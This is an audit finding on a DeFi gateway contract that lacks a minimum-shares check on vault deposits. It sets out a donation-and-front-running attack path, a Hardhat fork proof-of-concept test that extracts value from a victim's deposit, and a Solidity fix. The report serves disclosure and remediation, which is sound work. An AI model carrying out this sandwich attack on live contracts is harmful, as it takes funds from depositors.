### Title
Missing slippage (min-shares) check on Vesper vToken deposit allows donation-based sandwich loss - (File: contracts/VesperGateway.sol)

### Summary
`VesperGateway.deposit()` converts user-supplied `underlying` into Vesper `vToken` shares and deposits them as Metronome collateral without any minimum-shares / minimum-collateral parameter. Because the Vesper `VPool` exchange rate (`pricePerShare`) can be moved within the same transaction block by an unprivileged attacker via a donation to the pool, the victim receives fewer vToken shares than the fair rate — the same bug class as the reported "no `amount0Min`/`amount1Min` on liquidity deposits" issue.

### Finding Description
In `VesperGateway.deposit`, the flow is:

```solidity
// contracts/VesperGateway.sol
_underlying.safeTransferFrom(_msgSender, address(this), amount_);
_underlying.safeApprove(address(vToken_), 0);
_underlying.safeApprove(address(vToken_), amount_);
uint256 _balanceBefore = vToken_.balanceOf(address(this));
vToken_.deposit(amount_);                                  // mints shares at current pricePerShare
uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;
IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
vToken_.safeApprove(address(_depositToken), 0);
vToken_.safeApprove(address(_depositToken), _vTokenAmount);
_depositToken.deposit(_vTokenAmount, _msgSender);          // credits whatever shares were minted
```

There is no `minVTokenOut_`-style parameter. Whatever shares `vToken_.deposit(amount_)` mints are unconditionally credited to the user as `msd` collateral.

By contrast, every other value-conversion path in the codebase enforces caller-chosen slippage bounds: `SmartFarmingManager.leverage` reverts with `LeverageSlippageTooHigh` when `_depositAmount < depositAmountMin_` (line 198), `SmartFarmingManager.flashRepay` reverts with `FlashRepaySlippageTooHigh` when `_swapAmountOut < swapAmountOutMin_` (line 126), and the cross-chain dispatcher flows carry `amountOutMin_`/`depositAmountMin_`/`repayAmountMin_` parameters. The analogous external-liquidity-conversion entry point `VesperGateway.deposit` has no such bound.

Attack path (all unprivileged):
1. Victim signs/calls `VesperGateway.deposit(pool_, vToken_, amount_)`.
2. Attacker front-runs by donating `underlying` directly to the Vesper `VPool` contract (or executing a large deposit), inflating `pricePerShare`.
3. Victim's `vToken_.deposit(amount_)` mints shares at the inflated price — fewer vTokens — which are then locked in `DepositToken` as the victim's collateral.
4. Attacker back-runs by redeeming/withdrawing, recovering the donation plus a share of the value the victim deposited at the bad rate.

`deposit()` also lacks the `nonReentrant` guard that `withdraw()` carries (lines 44 vs 73), though the primary issue is the missing min-out check.

### Impact Explanation
Direct loss of user collateral value: the victim's `msdVa*` deposit token balance corresponds to fewer vTokens than the fair exchange rate for the `underlying` they supplied. The lost value is absorbed by the Vesper pool and partially extracted by the attacker. This is direct theft of user funds via same-block manipulation, not an oracle correctness issue.

### Likelihood Explanation
- Fully unprivileged: requires only an EOA able to (a) transfer `underlying` to the VPool contract and (b) front-run the victim transaction.
- No privileged role, oracle fault, or governance setting is needed — the missing check exists on the deployed code path regardless of configuration.
- Profitability depends on the attacker's share of the VPool (standard vault-donation economics); the loss to the victim is unconditional on the deposit executing at the manipulated rate.
- Note: the same gap exists symmetrically in `withdraw()` (no `minUnderlyingOut_` on `vToken_.withdraw`), which is protected only by `nonReentrant`, not by a slippage bound.

### Recommendation
Add a `minVTokenOut_` (and, for symmetry, `minUnderlyingOut_` on `withdraw`) parameter and revert if the measured balance delta is below it, mirroring the existing `_swap(..., amountOutMin_)` / `LeverageSlippageTooHigh` pattern in `SmartFarmingManager`:

```solidity
function deposit(IPool pool_, IVPool vToken_, uint256 amount_, uint256 minVTokenOut_) external {
    ...
    uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;
    if (_vTokenAmount < minVTokenOut_) revert DepositSlippageTooHigh();
    ...
}
```

### Proof of Concept
Hardhat fork test (mainnet fork with a real Vesper pool, e.g. `vaETH`, and the deployed `Pool`/`DepositToken`/`VesperGateway` proxies):

```ts
// test/VesperGateway.slippage.fork.ts — outline
it('victim receives fewer vTokens when pricePerShare is inflated', async () => {
  const vToken = IVPool.at(VAETH);            // real Vesper pool
  const weth = IERC20.at(WETH);
  const attacker = signers[1], victim = signers[2];

  // fund attacker and victim with WETH
  await deal(WETH, attacker.address, donation.add(shareAmount));
  await deal(WETH, victim.address, victimAmount);

  // attacker acquires a large share position
  await weth.connect(attacker).approve(vToken.address, shareAmount);
  await vToken.connect(attacker).deposit(shareAmount);

  // attacker front-runs: donation inflates pricePerShare
  const ppsBefore = await vToken.pricePerShare();
  await weth.connect(attacker).transfer(vToken.address, donation); // donate
  const ppsAfter = await vToken.pricePerShare();
  expect(ppsAfter).to.be.gt(ppsBefore);

  // victim deposits via gateway — no min-out, executes at bad rate
  await weth.connect(victim).approve(vesperGateway.address, victimAmount);
  await vesperGateway.connect(victim).deposit(pool.address, vToken.address, victimAmount);

  const depositToken = await ethers.getContractAt('DepositToken', await pool.depositTokenOf(vToken.address));
  const victimMsd = await depositToken.balanceOf(victim.address);

  // victim got strictly fewer shares than victimAmount / ppsBefore
  const fairShares = victimAmount.mul(parseEther('1')).div(ppsBefore);
  expect(victimMsd).to.be.lt(fairShares);

  // attacker redeems shares at inflated price and profits a portion of victim's deposit
  await vToken.connect(attacker).withdraw(await vToken.balanceOf(attacker.address));
  expect(await weth.balanceOf(attacker.address)).to.be.gt(shareAmount.add(donation).sub(epsilon));
});
```

All steps use public entry points only (`ERC20.transfer`, `VPool.deposit/withdraw`, `VesperGateway.deposit`), consistent with the unprivileged-attacker model including donations and front-running.
